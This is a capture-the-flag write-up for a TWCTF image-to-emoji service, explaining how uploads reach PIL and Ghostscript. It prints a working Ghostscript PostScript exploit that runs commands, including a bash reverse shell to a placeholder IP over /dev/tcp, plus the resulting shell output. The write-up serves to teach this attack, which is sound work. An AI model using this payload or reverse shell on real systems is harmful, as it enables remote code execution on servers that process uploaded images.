# Slack Emoji Converter

## Setup

For this problem, we are given a surprisingly basic website. It allows you to upload an image, and it returns a rescaled image with the same contents but suitable for a slack emoji. Upon poking at the client source, we notice a commented out link for `/source`. Upon navigation, we see the python source code for this problem.

## Analysis

The actual problem itself is surprisingly simple. The total source is under 50 lines of python, and a lot of that is boilerplate. The only interesting lines are these

```python
@app.route('/conv', methods=['POST'])
def conv():
    f = request.files.get('image', None)
    if not f:
        return redirect(url_for('index'))
    ext = f.filename.split('.')[-1]
    fname = tempfile.mktemp("emoji")
    fname = "{}.{}".format(fname, ext)
    f.save(fname)
    img = Image.open(fname)
    w, h = img.size
    r = 128/max(w, h)
    newimg = img.resize((int(w*r), int(h*r)))
    newimg.save(fname)
    response = make_response()
    response.data = open(fname, "rb").read()
    response.headers['Content-Disposition'] = 'attachment; filename=emoji_{}'.format(f.filename)
    os.unlink(fname)
    return response
```

At first glance, this seems relatively safe. All it does is save the image from the file handler, then load it into PIL. Then, once PIL has it, it resizes the image, saves it again and then reads it as binary and serves it in the response. While the file passing around seems odd at first, its worth noting that PIL doesn't obviously support loading and saving images from buffers. In reality, this can be done using BufIO, but it is not unusual to see hacks like these in the wild. 

The other interesting thing is that the filename gets directly injected into the `Content-Disposition` header. While this ultimately is not useful in the context of this problem, that does allow a slight injection with regard to the resulting service name. However, since it only affects the client, it is probably not super useful here.

Going back to the weird saving and loading of the image, we should look at how PIL loads images. Specifically, how it chooses the decoder for them. Although you could read through the source to try and figure this out, a simple Google search for `pil rce` yields a number of vulnerabilities related to the EPS decoder. When trying to open an EPS image, PIL invokes something called Ghostscript that parses the file and generates the image. Unfortunately for PIL (but fortunately for us), Ghostscript is notorious for its bugs. In fact, just over a week ago Tavis Ormandy [tweeted](https://twitter.com/taviso/status/1031887543233478656) out details of some new code execution pathways.

For the purposes of this problem, lets look at one of the ones he found.


```postscript
%!PS-Adobe-2.0
%%BoundingBox: -0 -0 1000 1000

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

When loaded by Ghostscript, this file runs the `id` command. Well if we swap out that `id` command with a reverse shell, we should have complete control! Let's try it

```postscript
%!PS-Adobe-2.0
%%BoundingBox: -0 -0 1000 1000

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/XXX.XXX.XXX.XXX/12345 0>&1') currentdevice putdeviceprops
```

```bash
emoji@emoji-57f556ff55-92ww8:/srv/emoji$ ls
app.py
templates
uwsgi.ini
emoji@emoji-57f556ff55-92ww8:/srv/emoji$ cat /flag
TWCTF{watch_0ut_gh0stscr1pt_everywhere}
```

And there we have it, a nice clean flag